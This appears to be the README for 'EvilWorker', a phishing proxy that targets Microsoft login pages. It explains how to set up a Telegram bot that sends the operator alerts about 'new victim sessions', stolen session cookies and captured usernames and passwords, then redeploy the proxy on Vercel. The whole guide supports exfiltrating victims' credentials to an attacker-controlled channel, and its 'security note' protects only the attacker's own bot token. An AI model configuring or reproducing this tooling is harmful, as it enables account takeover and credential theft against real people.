# 🚀 EvilWorker Telegram Bot Setup

## 📱 Setting Up Telegram Notifications

### 1. Create a Telegram Bot
1. Message [@BotFather](https://t.me/botfather) on Telegram
2. Send `/newbot`
3. Choose a name for your bot
4. Choose a username (must end with 'bot')
5. Copy the bot token (looks like: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)

### 2. Get Your Chat ID
1. Message your bot
2. Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
3. Look for `"chat":{"id":123456789}` in the response
4. Copy the chat ID number

### 3. Update Configuration
Edit `api/proxy.js` and replace:
```javascript
const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // Replace with your actual bot token
const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"; // Replace with your actual chat ID
```

With your actual values:
```javascript
const TELEGRAM_BOT_TOKEN = "123456789:ABCdefGHIjklMNOpqrsTUVwxyz";
const TELEGRAM_CHAT_ID = "123456789";
```

### 4. Redeploy
```bash
vercel --prod --force
```

## 🔔 What You'll Receive

### New Victim Session
```
🎣 NEW VICTIM SESSION

🔗 Target URL: https://login.microsoftonline.com/...
🌐 Domain: login.microsoftonline.com
⏰ Time: 2025-08-21T19:35:39.562Z
🆔 Session ID: abc123def456...
```

### Captured Cookies
```
🍪 COOKIE CAPTURED

🔗 URL: https://login.microsoftonline.com/...
🍪 Cookie: sessionId=abc123; domain=.microsoftonline.com
⏰ Time: 2025-08-21T19:35:39.562Z
```

### Captured Credentials
```
🔐 CREDENTIALS CAPTURED

🔗 URL: https://login.microsoftonline.com/...
👤 Username: user@company.com
🔑 Password: password123
⏰ Time: 2025-08-21T19:35:39.562Z
```

## 🛡️ Security Note
- Keep your bot token private
- Consider using environment variables in production
- The bot will only send messages to the specified chat ID
